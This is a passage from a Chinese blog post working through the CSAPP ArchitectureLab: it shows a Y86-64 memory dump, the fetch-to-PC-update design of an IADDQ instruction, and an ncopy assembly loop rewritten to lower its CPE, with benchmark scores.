0x0000000000000000      0x0000000000000040</span><br><span class="line">0x01b8: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x01c0: 0x0000000000000000      0x00000000000000b0</span><br><span class="line">0x01c8: 0x0000000000000000      0x0000000000000c00</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br></pre></td></tr></table></figure>



<h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><p><strong>IADDQ设计:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fetch:</span><br><span class="line">        icode:ifun      &lt;--     M1[PC]</span><br><span class="line">        rA:rB           &lt;--     M1[PC+1]</span><br><span class="line">        valC            &lt;--     M8[PC+2]</span><br><span class="line">        valP            &lt;--     PC+10</span><br><span class="line">decode:</span><br><span class="line"></span><br><span class="line">        valB            &lt;--     R[rB]</span><br><span class="line">execute:</span><br><span class="line">        valE            &lt;--     valC + valB</span><br><span class="line">        Set CC</span><br><span class="line">memory access:</span><br><span class="line"></span><br><span class="line">write back:</span><br><span class="line">        R[rB]           &lt;--     valE</span><br><span class="line">PC update:</span><br><span class="line">        PC              &lt;--     valP</span><br></pre></td></tr></table></figure>



<h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><p>这里更改了<code>pipe-full.hcl</code>文件，添加了<code>iaddq</code>指令，并且将<code>JXX</code>指令的分支预测策略改为了<strong>从不跳转</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">##################################################################</span><br><span class="line"># Do not modify this portion</span><br><span class="line"># Function prologue.</span><br><span class="line"># %rdi = src, %rsi = dst, %rdx = len</span><br><span class="line">ncopy:</span><br><span class="line"></span><br><span class="line">##################################################################</span><br><span class="line"># You can modify this portion</span><br><span class="line">        # Loop header</span><br><span class="line">        xorq %rax,%rax          # count = 0;</span><br><span class="line">        andq %rdx,%rdx          # len &lt;= 0?</span><br><span class="line">        jle Done                # if so, goto Done:</span><br><span class="line">Loop:</span><br><span class="line">        mrmovq (%rdi), %r10     # read val from src...</span><br><span class="line">        rmmovq %r10, (%rsi)     # ...and store it to dst</span><br><span class="line">        andq %r10, %r10         # val &lt;= 0?</span><br><span class="line">        jle Npos                # if so, goto Npos:</span><br><span class="line">        iaddq $1, %rax          # count++</span><br><span class="line">Npos:</span><br><span class="line">        iaddq $-1, %rdx         # len--</span><br><span class="line">        iaddq $8, %rdi          # src++</span><br><span class="line">        iaddq $8, %rsi          # dst++</span><br><span class="line">        andq %rdx, %rdx         # len &gt; 0?</span><br><span class="line">        jg Loop                 # if so, goto Loop:</span><br><span class="line">##################################################################</span><br></pre></td></tr></table></figure>



<p><strong>benchmark reuslt:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Average CPE     2.01</span><br><span class="line">Score   60.0/60.0</span><br></pre></td></tr></table></figure>

<p>如果Npos标签内这么写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Npos:</span><br><span class="line">        iaddq $8, %rdi          # src++</span><br><span class="line">        iaddq $8, %rsi          # dst++</span><br><span class="line">        iaddq $-1, %rdx         # len--</span><br><span class="line">        jg Loop                 # if so, goto Loop:</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Average CPE     1.96</span><br><span class="line">Score   60.0/60.0</span><br></pre></td></tr></table></figure>



<h1 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h1>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/hzrr">项目</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-DataLab"><span class="toc-number">1.</span> <span class="toc-text">1. DataLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-1"><span class="toc-number">1.1.</span> <span class="toc-text">Problem 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-2"><span class="toc-number">1.2.</span> <span class="toc-text">Problem 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-3"><span class="toc-number">1.3.</span> <span class="toc-text">Problem 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-4"><span class="toc-number">1.4.</span> <span class="toc-text">Problem 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-5"><span class="toc-number">1.5.</span> <span class="toc-text">Problem 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-6"><span class="toc-number">1.6.</span> <span class="toc-text">Problem 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-7"><span class="toc-number">1.7.</span> <span class="toc-text">Problem 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-8"><span class="toc-number">1.8.</span> <span class="toc-text">Problem 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-9"><span class="toc-number">1.9.</span> <span class="toc-text">Problem 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-10"><span class="toc-number">1.10.</span> <span class="toc-text">Problem 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-11"><span class="toc-number">1.11.</span> <span class="toc-text">Problem 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-12"><span class="toc-number">1.12.</span> <span class="toc-text">Problem 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-13"><span class="toc-number">1.13.</span> <span class="toc-text">Problem 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Problem-14"><span class="toc-number">1.14.</span> <span class="toc-text">Problem 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summarize"><span class="toc-number">1.15.</span> <span class="toc-text">Summarize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-BombLab"><span class="toc-number">2.</span> <span class="toc-text">2. BombLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-1"><span class="toc-number">2.1.</span> <span class="toc-text">Phase-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer"><span class="toc-number">2.1.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-2"><span class="toc-number">2.2.</span> <span class="toc-text">Phase-2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-3"><span class="toc-number">2.3.</span> <span class="toc-text">Phase-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-4"><span class="toc-number">2.4.</span> <span class="toc-text">Phase-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-5"><span class="toc-number">2.5.</span> <span class="toc-text">Phase-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-4"><span class="toc-number">2.5.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-6"><span class="toc-number">2.6.</span> <span class="toc-text">Phase-6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-5"><span class="toc-number">2.6.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summarize-1"><span class="toc-number">2.7.</span> <span class="toc-text">Summarize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-AttackLab"><span class="toc-number">3.</span> <span class="toc-text">3. AttackLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-1-1"><span class="toc-number">3.1.</span> <span class="toc-text">Phase-1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-6"><span class="toc-number">3.1.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-2-1"><span class="toc-number">3.2.</span> <span class="toc-text">Phase-2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-7"><span class="toc-number">3.2.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-3-1"><span class="toc-number">3.3.</span> <span class="toc-text">Phase-3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-8"><span class="toc-number">3.3.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-4-1"><span class="toc-number">3.4.</span> <span class="toc-text">Phase-4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-9"><span class="toc-number">3.4.1.</span> <span class="toc-text">Answer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phase-5-1"><span class="toc-number">3.5.</span> <span class="toc-text">Phase-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Answer-10"><span class="toc-number">3.5.1.</span> <span class="toc-text">Answer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-ArchitectureLab"><span class="toc-number">4.</span> <span class="toc-text">4. ArchitectureLab</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-A"><span class="toc-number">4.1.</span> <span class="toc-text">Part A</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-sum-list"><span class="toc-number">4.1.1.</span> <span class="toc-text">Function sum_list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-rsum-list"><span class="toc-number">4.1.2.</span> <span class="toc-text">Function rsum_list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-copy-block"><span class="toc-number">4.1.3.</span> <span class="toc-text">Function copy_block</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-B"><span class="toc-number">4.2.</span> <span class="toc-text">Part B</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-C"><span class="toc-number">4.3.</span> <span class="toc-text">Part C</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5"><span class="toc-number">5.</span> <span class="toc-text">5.</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://www.hzrr.com/2023/12/11/CSAPP-Labs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&text=CSAPP_Labs"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&is_video=false&description=CSAPP_Labs"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CSAPP_Labs&body=Check out this article: http://www.hzrr.com/2023/12/11/CSAPP-Labs/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&title=CSAPP_Labs"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&name=CSAPP_Labs&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://www.hzrr.com/2023/12/11/CSAPP-Labs/&t=CSAPP_Labs"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2024
    HzRr
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/hzrr">项目</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'cactus-1';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
